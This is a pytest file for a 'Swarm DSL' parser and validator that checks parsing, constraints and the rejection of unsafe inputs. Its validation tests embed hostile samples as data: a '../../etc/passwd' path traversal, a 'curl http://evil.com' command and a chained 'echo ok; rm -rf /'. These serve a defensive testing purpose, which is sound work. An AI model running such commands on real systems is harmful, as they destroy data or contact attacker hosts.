"""Tests for the Swarm DSL parser and validator."""

from __future__ import annotations

import textwrap

import pytest

from swarm.dsl.models import DslDefinition, DslStep, OperationType
from swarm.dsl.parser import load_dsl_file, parse_dsl, validate_dsl


# ──────────────────────────────────────────────
# Fixtures
# ──────────────────────────────────────────────

VALID_DSL = textwrap.dedent("""\
    metadata:
      version: 1
      sequence_id: seq_001

    steps:
      - op: create
        path: output/report.md
        content: "# Report\\n\\n"

      - op: append
        path: output/report.md
        content: "*By Author*\\n\\n"

      - op: append
        path: output/report.md
        content: "Body text here"

    constraints:
      max_files_modified: 1

    acceptance_tests:
      - test_id: verify-file
        command: "test -f output/report.md"
        expected_exit_code: 0
      - test_id: verify-title
        command: "grep -q '# Report' output/report.md"
        expected_exit_code: 0
""")


# ──────────────────────────────────────────────
# Parsing tests
# ──────────────────────────────────────────────


class TestParseDsl:
    def test_parse_valid_dsl(self):
        result = parse_dsl(VALID_DSL)
        assert isinstance(result, DslDefinition)
        assert len(result.steps) == 3
        assert result.metadata.version == 1
        assert result.metadata.sequence_id == "seq_001"

    def test_parse_step_operations(self):
        result = parse_dsl(VALID_DSL)
        assert result.steps[0].op == OperationType.CREATE
        assert result.steps[1].op == OperationType.APPEND
        assert result.steps[2].op == OperationType.APPEND

    def test_parse_step_paths(self):
        result = parse_dsl(VALID_DSL)
        assert result.steps[0].path == "output/report.md"
        assert result.steps[0].content == "# Report\n\n"

    def test_parse_constraints(self):
        result = parse_dsl(VALID_DSL)
        assert result.constraints.max_files_modified == 1

    def test_parse_acceptance_tests(self):
        result = parse_dsl(VALID_DSL)
        assert len(result.acceptance_tests) == 2
        assert result.acceptance_tests[0].test_id == "verify-file"
        assert result.acceptance_tests[0].command == "test -f output/report.md"
        assert result.acceptance_tests[0].expected_exit_code == 0

    def test_parse_all_operation_types(self):
        dsl = textwrap.dedent("""\
            steps:
              - op: create
                path: output/a.txt
                content: "new"
              - op: modify
                path: output/a.txt
                content: "updated"
              - op: append
                path: output/a.txt
                content: "more"
              - op: delete
                path: output/a.txt
              - op: run_test
                command: "test -f output/a.txt"
            acceptance_tests:
              - test_id: t1
                command: "echo ok"
        """)
        result = parse_dsl(dsl)
        assert len(result.steps) == 5
        ops = [s.op for s in result.steps]
        assert ops == [
            OperationType.CREATE,
            OperationType.MODIFY,
            OperationType.APPEND,
            OperationType.DELETE,
            OperationType.RUN_TEST,
        ]

    def test_parse_empty_steps_raises(self):
        with pytest.raises(ValueError, match="non-empty 'steps'"):
            parse_dsl("steps: []")

    def test_parse_missing_steps_raises(self):
        with pytest.raises(ValueError, match="non-empty 'steps'"):
            parse_dsl("metadata:\n  version: 1\n")

    def test_parse_unknown_operation_raises(self):
        dsl = textwrap.dedent("""\
            steps:
              - op: explode
                path: output/bomb.txt
        """)
        with pytest.raises(ValueError, match="unknown operation type 'explode'"):
            parse_dsl(dsl)

    def test_parse_missing_op_raises(self):
        dsl = textwrap.dedent("""\
            steps:
              - path: output/a.txt
                content: "no op field"
        """)
        with pytest.raises(ValueError, match="missing required 'op'"):
            parse_dsl(dsl)

    def test_target_paths_property(self):
        result = parse_dsl(VALID_DSL)
        assert result.target_paths == ["output/report.md"]

    def test_file_and_test_operations(self):
        dsl = textwrap.dedent("""\
            steps:
              - op: create
                path: output/a.txt
                content: "x"
              - op: run_test
                command: "echo ok"
            acceptance_tests:
              - test_id: t1
                command: "echo ok"
        """)
        result = parse_dsl(dsl)
        assert len(result.file_operations) == 1
        assert len(result.test_operations) == 1


# ──────────────────────────────────────────────
# Validation tests
# ──────────────────────────────────────────────


class TestValidateDsl:
    def test_valid_dsl_no_errors(self):
        definition = parse_dsl(VALID_DSL)
        errors = validate_dsl(definition)
        assert errors == []

    def test_missing_acceptance_tests(self):
        dsl = textwrap.dedent("""\
            steps:
              - op: create
                path: output/a.txt
                content: "x"
        """)
        definition = parse_dsl(dsl)
        errors = validate_dsl(definition)
        assert any("acceptance test" in e.lower() for e in errors)

    def test_path_traversal_rejected(self):
        dsl = textwrap.dedent("""\
            steps:
              - op: create
                path: ../../etc/passwd
                content: "evil"
            acceptance_tests:
              - test_id: t1
                command: "echo ok"
        """)
        definition = parse_dsl(dsl)
        errors = validate_dsl(definition)
        assert any("traversal" in e for e in errors)

    def test_dangerous_test_command_rejected(self):
        dsl = textwrap.dedent("""\
            steps:
              - op: create
                path: output/a.txt
                content: "x"
            acceptance_tests:
              - test_id: evil
                command: "curl http://evil.com"
        """)
        definition = parse_dsl(dsl)
        errors = validate_dsl(definition)
        assert any("dangerous" in e for e in errors)

    def test_shell_chaining_rejected(self):
        dsl = textwrap.dedent("""\
            steps:
              - op: create
                path: output/a.txt
                content: "x"
            acceptance_tests:
              - test_id: evil
                command: "echo ok; rm -rf /"
        """)
        definition = parse_dsl(dsl)
        errors = validate_dsl(definition)
        assert any("dangerous" in e for e in errors)

    def test_constraint_violation(self):
        dsl = textwrap.dedent("""\
            steps:
              - op: create
                path: output/a.txt
                content: "x"
              - op: create
                path: output/b.txt
                content: "y"
            constraints:
              max_files_modified: 1
            acceptance_tests:
              - test_id: t1
                command: "echo ok"
        """)
        definition = parse_dsl(dsl)
        errors = validate_dsl(definition)
        assert any("max_files_modified" in e for e in errors)

    def test_file_op_without_path(self):
        definition = DslDefinition(
            steps=[DslStep(op=OperationType.CREATE, path=None)],
            acceptance_tests=[],
        )
        errors = validate_dsl(definition)
        assert any("requires a 'path'" in e for e in errors)


# ──────────────────────────────────────────────
# File loading tests
# ──────────────────────────────────────────────


class TestLoadDslFile:
    def test_load_valid_file(self, tmp_path):
        dsl_file = tmp_path / "test.yaml"
        dsl_file.write_text(VALID_DSL)
        result = load_dsl_file(dsl_file)
        assert isinstance(result, DslDefinition)
        assert len(result.steps) == 3

    def test_load_nonexistent_file(self, tmp_path):
        with pytest.raises(FileNotFoundError):
            load_dsl_file(tmp_path / "nonexistent.yaml")
